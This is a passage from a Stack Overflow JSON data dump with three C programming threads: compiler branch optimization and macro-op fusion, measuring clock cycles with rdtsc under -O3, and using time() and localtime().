[c], 99\n    setne    cl\n    dec      ecx\n    and      ecx, 15\n    mov      DWORD PTR [eax], ecx\n    ret      0\ntest1 ENDP\n</code></pre>\n\n<p>Note that <code>test1</code> gives you branchless code that utilizes the <code>SETNE</code> instruction (a conditional set, which will set its operand to 0 or 1 based on the condition code\u2014in this case, <code>NE</code>) in conjunction with some bit-manipulation to produce the correct value. <code>test0</code> uses a conditional branch to skip over the assignment of 15 to <code>*x</code>.</p>\n\n<p>The reason this is interesting is because it is almost exactly the <em>opposite</em> of what you might expect. Na\u00efvely, one might expect that <code>test0</code> would be the way you'd hold the optimizer's hand and get it to generate branchless code. At least, that's the first thought that went through my head. But in fact, that is not the case! The optimizer is able to recognize the <code>if</code>/<code>else</code> idiom and optimize accordingly! It is not able to make that same optimization in the case of <code>test0</code>, where you tried to outsmart it.</p>\n\n<blockquote>\n  <p>However when adding an extra variable ... The assembly suddenly becomes different</p>\n</blockquote>\n\n<p>Well, no surprise there. A small change in the code can often have a significant effect on the emitted code. Optimizers are not magic; they are just really complex pattern matchers. You changed the pattern!</p>\n\n<p>Granted, an optimizing compiler <em>could</em> have used two conditional moves here to generate branchless code. In fact, that is precisely what Clang 3.9 does for <code>test3</code> (but not for <code>test2</code>, consistent with our above analysis showing that optimizers may be better able to recognize standard patterns than unusual ones). But GCC doesn't do this. Again, there is no guarantee of a particular optimization being performed.</p>\n\n<blockquote>\n  <p>It seems that the only difference is if the top \"mov\"s are done before or after the \"je\".</p>\n  \n  <p>Now (sorry my assembly is a bit crude), isn't it always better to have the movs after the jump, in order to save pipeline flushes?</p>\n</blockquote>\n\n<p>No, not really. That would not improve the code in this case. If the branch is mispredicted, you're going to have a pipeline flush no matter what. It doesn't much matter whether the speculatively mispredicted code is a <code>ret</code> instruction or if it is a <code>mov</code> instruction.</p>\n\n<p>The only reason it would matter that a <code>ret</code> instruction immediately followed a conditional branch is if you were writing the assembly code by hand and didn't know to use a <code>rep ret</code> instruction. This is <a href=\"https://stackoverflow.com/questions/20526361/what-does-rep-ret-mean\">a trick necessary for certain AMD processors that avoids a branch-prediction penalty</a>. Unless you were an assembly guru, you probably wouldn't have known this trick. But the compiler does, and also knows it is not necessary when you're specifically targeting an Intel processor or different generation of AMD processor that doesn't have this quirk.</p>\n\n<p>However, you might be right about it being better to have the <code>mov</code>s after the branch, but not for the reason you suggested. Modern processors (I believe this is Nehalem and later, but I'd look it up in <a href=\"http://www.agner.org/optimize\" rel=\"nofollow noreferrer\">Agner Fog's excellent optimization guides</a> if I needed to verify) are capable of macro-op fusion under certain circumstances. Basically, macro-op fusion means that the CPU's decoder will combine two eligible instructions into one micro-op, saving bandwidth at all stages of the pipeline. A <code>cmp</code> or <code>test</code> instruction followed by a conditional branch instruction, as you see in <code>test3</code>, is eligible for macro-op fusion (actually, there are other conditions that must be met, but this code does meet those requirements). Scheduling other instructions in between the <code>cmp</code> and <code>je</code>, as you see in <code>test2</code>, makes macro-op fusion impossible, potentially making the code execute more slowly.</p>\n\n<p>Arguably, though, this is an optimization defect in the compiler. It <em>could</em> have reordered the <code>mov</code> instructions to place the <code>je</code> immediately after the <code>cmp</code>, preserving the ability for macro-op fusion:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>test2a(char, int*, int*):\n    mov     DWORD PTR [rsi], 0    ; do the default initialization *first*\n    mov     DWORD PTR [rdx], 0\n    cmp     dil, 99               ; this is now followed immediately by the conditional\n    je      .L10                  ;  branch, making macro-op fusion possible\n    rep ret\n.L10:\n    mov     DWORD PTR [rsi], 15\n    mov     DWORD PTR [rdx], 21\n    ret\n</code></pre>\n\n<p>Another difference between the object code for <code>test2</code> and <code>test3</code> is code size. Thanks to padding that is emitted by the optimizer to align the branch target, the code for <code>test3</code> is 4 bytes larger than <code>test2</code>. Very unlikely that is enough difference to matter, though, especially if this code is not being executed within a tight loop where it is guaranteed to be hot in the cache.</p>\n\n<p>So, does that mean you should always write the code as you did in <code>test2</code>?<br>\nWell, no, for several reasons:</p>\n\n<ol>\n<li>As we have seen, it <em>might</em> be a pessimization, since the optimizer may not recognize the pattern.</li>\n<li>You should write code for readability and semantic correctness <em>first</em>, only going back to optimize it when your profiler indicates that it is actually a bottleneck. And then, you should only optimize after inspecting and verifying the object code emitted by your compiler, otherwise you could end up with a pessimization. (The standard \"trust your compiler until proven otherwise\" advice.)</li>\n<li><p>Even though it may be optimal in certain very simple cases, the \"preset\" idiom is not generalizable. If your initialization is time-consuming, it may be faster to skip over it when possible. (There is one example discussed <a href=\"https://codereview.stackexchange.com/questions/149900/format-rgb-long-as-hex-string-in-vb6/150074#150074\">here, in the context of VB 6</a>, where string-manipulation is so slow that eliding it when possible actually results in faster execution time than fancy branchless code. More generally, the same rationale would apply if you were able to branch around a function call.)</p>\n\n<p>Even here, where it appears to result in very simple and possibly more optimal code, it may actually be slower because you are writing to memory <em>twice</em> in the case where <code>c</code> is equal to 99, and saving nothing in the case where <code>c</code> is <em>not</em> equal to 99.</p>\n\n<p>You might save this cost by rewriting the code such that it accumulates the final value in a temporary register, only storing it to memory at the end, <em>e.g.</em>:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>test2b(char, int*, int*):\n    xor     eax, eax               ; pre-zero the EAX register\n    xor     ecx, ecx               ; pre-zero the ECX register\n    cmp     dil, 99\n    je      Done\n    mov     eax, 15                ; change the value in EAX if necessary\n    mov     ecx, 21                ; change the value in ECX if necessary\nDone:\n    mov     DWORD PTR [rsi], eax   ; store our final temp values to memory\n    mov     DWORD PTR [rdx], ecx\n    ret\n</code></pre>\n\n<p>but this clobbers two additional registers (<code>eax</code> and <code>ecx</code>) and may not actually be faster. You'd have to benchmark it. Or trust the compiler to emit this code when it is actually optimal, such as when it has inlined a function like <code>test2</code> within a tight loop.</p></li>\n<li><p>Even if you could guarantee that writing the code in a certain way would cause the compiler to emit branchless code, this would not necessarily be faster! While branches are slow when they are mispredicted, mispredictions are actually quite rare. Modern processors have <em>extremely</em> good branch prediction engines, achieving prediction accuracies of greater than 99% in most cases.</p>\n\n<p>Conditional moves are great for avoiding branch mispredictions, but they have the important disadvantage of increasing the length of a dependency chain. By contrast, a correctly predicted branch <em>breaks</em> the dependency chain. (This is probably why GCC doesn't emit two CMOV instructions when you add the extra variable.) A conditional move is only a performance win if you <em>expect</em> branch prediction to fail. If you can count on a prediction success rate of ~75% or better, a conditional branch is probably faster, because it breaks the dependency chain and has a lower latency. And I would suspect that would be the case here, unless <code>c</code> alternates rapidly back and forth between 99 and not-99 each time the function is called. (See <a href=\"http://www.agner.org/optimize/optimizing_assembly.pdf\" rel=\"nofollow noreferrer\">Agner Fog's \"Optimizing subroutines in assembly language\"</a>, pp 70\u201371.)</p></li>\n</ol>\n"}], "owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 644, "favorite_count": 3, "accepted_answer_id": 41360607, "answer_count": 1, "score": 12, "last_activity_date": 1482950183, "creation_date": 1482917108, "last_edit_date": 1482950183, "question_id": 41359023, "link": "https://stackoverflow.com/questions/41359023/is-if-else-faster-than-if-default", "title": "Is if else faster than if + default?", "body": "<p>I conducted a simple experiment, to compare if-else to only an if (with default values preset). Example:</p>\n\n<pre><code>void test0(char c, int *x) {\n    *x = 0;\n    if (c == 99) {\n        *x = 15;\n    }\n}\n\nvoid test1(char c, int *x) {\n    if (c == 99) {\n        *x = 15;\n    } else {\n        *x = 0;\n    }\n}\n</code></pre>\n\n<p>For the functions above, I got the exact same assembly code (using <code>cmovne</code>).</p>\n\n<p>However when adding an extra variable:</p>\n\n<pre><code>void test2(char c, int *x, int *y) {\n    *x = 0;\n    *y = 0;\n    if (c == 99) {\n        *x = 15;\n        *y = 21;\n    }\n}\n\nvoid test3(char c, int *x, int *y) {\n    if (c == 99) {\n        *x = 15;\n        *y = 21;\n    } else {\n        *x = 0;\n        *y = 0;\n    }\n}\n</code></pre>\n\n<p>The assembly suddenly becomes different:</p>\n\n<pre><code>test2(char, int*, int*):\n        cmp     dil, 99\n        mov     DWORD PTR [rsi], 0\n        mov     DWORD PTR [rdx], 0\n        je      .L10\n        rep ret\n.L10:\n        mov     DWORD PTR [rsi], 15\n        mov     DWORD PTR [rdx], 21\n        ret\ntest3(char, int*, int*):\n        cmp     dil, 99\n        je      .L14\n        mov     DWORD PTR [rsi], 0\n        mov     DWORD PTR [rdx], 0\n        ret\n.L14:\n        mov     DWORD PTR [rsi], 15\n        mov     DWORD PTR [rdx], 21\n        ret\n</code></pre>\n\n<p>It seems that the only difference is if the top <code>mov</code>s are done before or after the <code>je</code>. </p>\n\n<p>Now (sorry my assembly is a bit crude), isn't it always better to have the <code>mov</code>s after the jump, in order to save pipeline flushes? And if so why wouldn't the optimizer (gcc6.2 -O3) use the better method?</p>\n"}, {"tags": ["c", "gcc", "codeblocks"], "comments": [{"owner": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482918387, "post_id": 41358925, "comment_id": 69920128, "body": "Yes, I will update the question in few minutes. I&#39;m calling rdtsc() and rdtscp() twice but actually it&#39;s recommended to call them thrice in the white paper of G. Paoloni at <a href=\"http://www.intel.com/content/dam/www/public/us/en/documents/white-papers/ia-32-ia-64-benchmark-code-execution-paper.pdf\" rel=\"nofollow noreferrer\">intel.com/content/dam/www/public/us/en/documents/white-paper&zwnj;&#8203;s/&hellip;</a>"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 1, "creation_date": 1482923719, "post_id": 41358925, "comment_id": 69922975, "body": "<code>pow(2.0, 29);</code> --&gt; <code>1 &lt;&lt; 29</code>"}], "answers": [{"comments": [{"owner": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483011185, "post_id": 41360306, "comment_id": 69959380, "body": "Yes, you are right that <i>(end-start)</i> &lt; 10000000 and that&#39;s why I get 0 at -O3. This is the reason that I&#39;m asking what to do for -O3? Don&#39;t you think that logically <i>end</i> is always greater than <i>start</i>? So, why utype64 result = <i>end</i> &gt; <i>start</i> ? <i>end</i> - <i>start</i> : <i>start</i> - <i>end</i>; ?"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483012031, "post_id": 41360306, "comment_id": 69959848, "body": "@user110219 I don&#39;t remember why I do that... my bad. Whatever I don&#39;t understand your question anymore. You have the number of cycle because it&#39;s 0. I don&#39;t see the problem. maybe you can use <a href=\"https://linux.die.net/man/3/clock_gettime\" rel=\"nofollow noreferrer\"><code>clock_gettime()</code></a>."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483012687, "post_id": 41360306, "comment_id": 69960175, "body": "@user110219 There should not be difference between <code>-O[0|1|2|3]</code> just optimization so the behavior should not change. The only thing that change is that your program is faster."}, {"owner": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483013582, "post_id": 41360306, "comment_id": 69960726, "body": "-O3 is showing a strange behavior and I&#39;ve also checked the values of <i>start</i> and <i>end</i> and the difference is something like 1600."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483013987, "post_id": 41360306, "comment_id": 69960955, "body": "@user110219 What strange behavior do you have? wrong result? Maybe <code>-O3</code> do the optimization proposed by L\u01b0u V\u0129nh Ph&#250;c. <code>-O3</code> can be very aggressive. Your compiler probably detect that your function produce the same result every time and remove the loop. You should look what is the code generate by your compiler. <a href=\"https://gcc.godbolt.org/\" rel=\"nofollow noreferrer\">gcc.godbolt.org</a> for example."}, {"owner": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483014555, "post_id": 41360306, "comment_id": 69961246, "body": "By strange behavior I mean why the difference b/w <i>start</i> and <i>end</i> is around 1600 when the loop is executed for 10000000. Yes, -O3 is doing something very aggressive."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "edited": false, "score": 0, "creation_date": 1483015244, "post_id": 41360306, "comment_id": 69961595, "body": "@user110219 Well this will be my last comment. This is not a strange behavior the purpose to <code>-O3</code> is to optimize the code. I look what is generate <a href=\"https://godbolt.org/g/50F9Li\" rel=\"nofollow noreferrer\">here</a>, gcc and clang call <code>srand</code> and <code>rand</code> because don&#39;t call them change the behavior but like you see the call to <code>schoolbook_9</code> is gone because you don&#39;t do anything with <code>Z</code>. Your result <code>1600</code> is correct."}], "tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": false, "score": 1, "last_activity_date": 1483011838, "last_edit_date": 1483011838, "creation_date": 1482921724, "answer_id": 41360306, "question_id": 41358925, "link": "https://stackoverflow.com/questions/41358925/how-to-count-clock-cycles-at-o3-using-codeblocks-16-01-in-windows-10/41360306#41360306", "title": "How to count clock cycles at -O3 using Code::Blocks 16.01 in Windows 10?", "body": "<p>It's because <code>end - start</code> is lower than <code>10000000</code> with <code>-O3</code>. Your division produce <code>0</code>.</p>\n\n<pre><code>utype64 result = end - start;\nutype64 cycle = 10000000;\nutype64 total = result / cycle;\nutype64 rest = result % cycle;\nprintf(\"The cycles count using SB of size 9 is \" PRIu64\n       \" and the rest is \" PRIu64 \"\\n\",\n       total, rest);\n</code></pre>\n\n<p>And you should not call twice <code>srand(time(NULL));</code>. It is useless and can produce strange behavior.</p>\n\n<p>Note: I can't test myself.</p>\n"}], "owner": {"reputation": 153, "user_id": 5740611, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c48e804ec5ab477d1e24fe8fd560b96b?s=128&d=identicon&r=PG&f=1", "display_name": "user110219", "link": "https://stackoverflow.com/users/5740611/user110219"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 136, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1483011838, "creation_date": 1482916781, "last_edit_date": 1482919152, "question_id": 41358925, "link": "https://stackoverflow.com/questions/41358925/how-to-count-clock-cycles-at-o3-using-codeblocks-16-01-in-windows-10", "title": "How to count clock cycles at -O3 using Code::Blocks 16.01 in Windows 10?", "body": "<p>In my C program I am counting the number of clock cycles on a 64-bit Intel Corei5-2410M Sandy Bridge machine running Windows 10 Home but there is something strange. I compile the program both at -O2 and -O3 using Code::Blocks (CB) 16.01 in release build. For -O2 the clock cycles are okay but -O3 returns 0 cycles. For now, I'm not taking turbo-boost and hyper-threading into consideration but definitely will disable them later.</p>\n\n<p>I use the following commands for compiling</p>\n\n<pre><code>mingw32-gcc.exe -Wall -O2 -m32 -IC:\\GMP\\include -c \"E:\\abc\\main.c\" -o obj\\Release\\main.o\nmingw32-gcc.exe -Wall -O3 -m32 -IC:\\GMP\\include -c \"E:\\abc\\main.c\" -o obj\\Release\\main.o\n</code></pre>\n\n<p>We have</p>\n\n<pre><code>void schoolbook_9(int32_t *X, int32_t *Y, int64_t *Z){\nZ[0] = (int64_t)X[0]*Y[0]  + (int64_t)X[1]*Y[1]  + (int64_t)X[2]*Y[2]  + (int64_t)X[3]*Y[3] + (int64_t)X[4]*Y[4] + (int64_t)X[5]*Y[5] + (int64_t)X[6]*Y[6] + (int64_t)X[7]*Y[7] + (int64_t)X[8]*Y[8];\nZ[1] = (int64_t)X[9]*Y[0]  + (int64_t)X[0]*Y[1]  + (int64_t)X[1]*Y[2]  + (int64_t)X[2]*Y[3] + (int64_t)X[3]*Y[4] + (int64_t)X[4]*Y[5] + (int64_t)X[5]*Y[6] + (int64_t)X[6]*Y[7] + (int64_t)X[7]*Y[8];\nZ[2] = (int64_t)X[10]*Y[0] + (int64_t)X[9]*Y[1]  + (int64_t)X[0]*Y[2]  + (int64_t)X[1]*Y[3] + (int64_t)X[2]*Y[4] + (int64_t)X[3]*Y[5] + (int64_t)X[4]*Y[6] + (int64_t)X[5]*Y[7] + (int64_t)X[6]*Y[8];\nZ[3] = (int64_t)X[11]*Y[0] + (int64_t)X[10]*Y[1] + (int64_t)X[9]*Y[2]  + (int64_t)X[0]*Y[3] + (int64_t)X[1]*Y[4] + (int64_t)X[2]*Y[5] + (int64_t)X[3]*Y[6] + (int64_t)X[4]*Y[7] + (int64_t)X[5]*Y[8];\nZ[4] = (int64_t)X[12]*Y[0] + (int64_t)X[11]*Y[1] + (int64_t)X[10]*Y[2] + (int64_t)X[9]*Y[3] + (int64_t)X[0]*Y[4] + (int64_t)X[1]*Y[5] + (int64_t)X[2]*Y[6] + (int64_t)X[3]*Y[7] + (int64_t)X[4]*Y[8];\nZ[5] = (int64_t)X[13]*Y[0] + (int64_t)X[12]*Y[1] + (int64_t)X[11]*Y[2] + (int64_t)X[10]*Y[3] + (int64_t)X[9]*Y[4] + (int64_t)X[0]*Y[5] + (int64_t)X[1]*Y[6] + (int64_t)X[2]*Y[7] + (int64_t)X[3]*Y[8];\nZ[6] = (int64_t)X[14]*Y[0] + (int64_t)X[13]*Y[1] + (int64_t)X[12]*Y[2] + (int64_t)X[11]*Y[3] + (int64_t)X[10]*Y[4] + (int64_t)X[9]*Y[5] + (int64_t)X[0]*Y[6] + (int64_t)X[1]*Y[7] + (int64_t)X[2]*Y[8];\nZ[7] = (int64_t)X[15]*Y[0] + (int64_t)X[14]*Y[1] + (int64_t)X[13]*Y[2] + (int64_t)X[12]*Y[3] + (int64_t)X[11]*Y[4] + (int64_t)X[10]*Y[5] + (int64_t)X[9]*Y[6] + (int64_t)X[0]*Y[7] + (int64_t)X[1]*Y[8];\nZ[8] = (int64_t)X[16]*Y[0] + (int64_t)X[15]*Y[1] + (int64_t)X[14]*Y[2] + (int64_t)X[13]*Y[3] + (int64_t)X[12]*Y[4] + (int64_t)X[11]*Y[5] + (int64_t)X[10]*Y[6] + (int64_t)X[9]*Y[7] + (int64_t)X[0]*Y[8];}\n</code></pre>\n\n<p>I'm counting the clock cycles as follows</p>\n\n<pre><code>int32_t X[17], Y[9];\nint64_t Z[9];\nutype64 start, end;\nuint32_t i;\n\nsrand(time(NULL));\nfor(i=0; i&lt;17; i++)\n    X[i] = rand()%(uint32_t)pow(2.0, 29);\nsrand(time(NULL));\nfor(i=0; i&lt;9; i++)\n    Y[i] = rand()%(uint32_t)pow(2.0, 29);\n\nstart=rdtsc();\nend=rdtscp();\nstart=rdtsc();\nfor(i=0; i&lt;10000000; i++)\n    schoolbook_9(X, Y, Z);\n\nend=rdtscp();\nprintf(\"\\n%s%\"PRIu64\"\\n\", \"The cycles count using SB of size 9 is :: \", (end-start)/10000000);\n</code></pre>\n\n<p>I'm using the rdtscp instruction because my system supports it and may be it is not available on 32-bit machine therefore, I have tested my program both with/out rdtscp. The arguments X, Y, and Z are arrays where X and Y are 32-bit and Z is 64-bit.</p>\n\n<p>So, my questions is how to get the cycles count at -O3? Because for the current code I get 0 cycle.</p>\n\n<p>The flage <em>-ftree-loop-vectorize</em> is set at -O3 as described on this page <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html\" rel=\"nofollow noreferrer\">https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html</a>. Does it mean that loop has been vectorized? If yes, then how can one determine what is the length (4 elements, 6 elements etc.) of the vector?</p>\n"}, {"tags": ["c", "linux", "function", "datetime", "gcc"], "comments": [{"owner": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482914597, "post_id": 41358276, "comment_id": 69918074, "body": "Thanks @Stargateur"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482914941, "post_id": 41358276, "comment_id": 69918232, "body": "You are only asking about standard C functions. Why so many tags? Especially where could some linux-kernel stuff get into the game?"}, {"owner": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482915339, "post_id": 41358276, "comment_id": 69918449, "body": "Sorry @Gerhadh. I have corrected the tags now."}], "answers": [{"comments": [{"owner": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "edited": false, "score": 0, "creation_date": 1482915196, "post_id": 41358400, "comment_id": 69918362, "body": "I see. I was earlier thinking that it meant that it was about adding the value passed to the epoch time. Its clear now. Thanks."}, {"owner": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "edited": false, "score": 0, "creation_date": 1482915268, "post_id": 41358400, "comment_id": 69918402, "body": "I could print the desired time format via using the structure in localtime( ). Isn&#39;t it? If so, then why strftime could be used?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "edited": false, "score": 1, "creation_date": 1482915470, "post_id": 41358400, "comment_id": 69918512, "body": "Not directly in one step. You get a structure holding values for day, month, hour, minute, etc. You can use these to print them separately. If you want to get a complete string at once you need to use <code>asctime()</code>. Or you pass the broken down parameters into strftime. Read the man page to get the finer details."}], "tags": [], "owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "is_accepted": false, "score": 1, "last_activity_date": 1482914868, "creation_date": 1482914868, "answer_id": 41358400, "question_id": 41358276, "link": "https://stackoverflow.com/questions/41358276/how-does-the-function-localtime-used/41358400#41358400", "title": "How does the function localtime() used?", "body": "<p>The man page is quite clear about that parameter:</p>\n\n<blockquote>\n<pre><code>time_t time(time_t *t); \n</code></pre>\n  \n  <p>...</p>\n  \n  <p>If <code>t</code> is non-<code>NULL</code>, the return value is also stored in the memory\n  pointed to by <code>t</code>.</p>\n</blockquote>\n\n<p>This means you can either use it like this:</p>\n\n<pre><code>time t;\nt = time(NULL);\n</code></pre>\n\n<p>or like this:</p>\n\n<pre><code>time t;\ntime(&amp;t);\n</code></pre>\n\n<p>As you correctly recognized the result in t is the number of seconds since the epoch.\nIf you want to get some human readable date and time you need to transform it via <a href=\"https://linux.die.net/man/3/localtime\" rel=\"nofollow noreferrer\">localtime()</a></p>\n"}, {"tags": [], "owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "is_accepted": false, "score": 0, "last_activity_date": 1482915627, "creation_date": 1482915627, "answer_id": 41358591, "question_id": 41358276, "link": "https://stackoverflow.com/questions/41358276/how-does-the-function-localtime-used/41358591#41358591", "title": "How does the function localtime() used?", "body": "<p><a href=\"https://linux.die.net/man/2/time\" rel=\"nofollow noreferrer\"><code>time()</code></a> is a very old function of the C lib. <code>time_t time(time_t *t);</code> Like you see, the prototype say that <code>time</code> take a <code>time_t *</code> as argument and return a <code>time_t</code>. This mean that you can have the result with two way. You can do like you do or:</p>\n\n<pre><code>time_t t;\nif ((time_t)-1 == time(&amp;t)) {\n  perror(\"time()\");\n  return 1;\n}\n</code></pre>\n\n<p>If you do <a href=\"https://linux.die.net/man/2/time\" rel=\"nofollow noreferrer\"><code>time(NULL)</code></a>, the function must not stock the result in the pointer <code>time_t *</code> because the man say:</p>\n\n<blockquote>\n  <p>If t is non-NULL, the return value is also stored in the memory\n  pointed to by t.</p>\n</blockquote>\n\n<p><a href=\"https://linux.die.net/man/3/localtime\" rel=\"nofollow noreferrer\"><code>localtime()</code></a> convert the number of second since the Epoch and split it in years, month, etc.. You should use <a href=\"https://linux.die.net/man/3/localtime\" rel=\"nofollow noreferrer\"><code>localtime_r()</code></a> because it's thread safe.</p>\n\n<pre><code>struct tm result;\nif (localtime_r(&amp;t, &amp;result) == NULL) {\n  return 1;\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 6336276, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/nejPw.jpg?s=128&g=1", "display_name": "Doherty", "link": "https://stackoverflow.com/users/6336276/doherty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 842, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1482923659, "creation_date": 1482914348, "last_edit_date": 1482923659, "question_id": 41358276, "link": "https://stackoverflow.com/questions/41358276/how-does-the-function-localtime-used", "title": "How does the function localtime() used?", "body": "<p>I am trying to understand what the statement below is 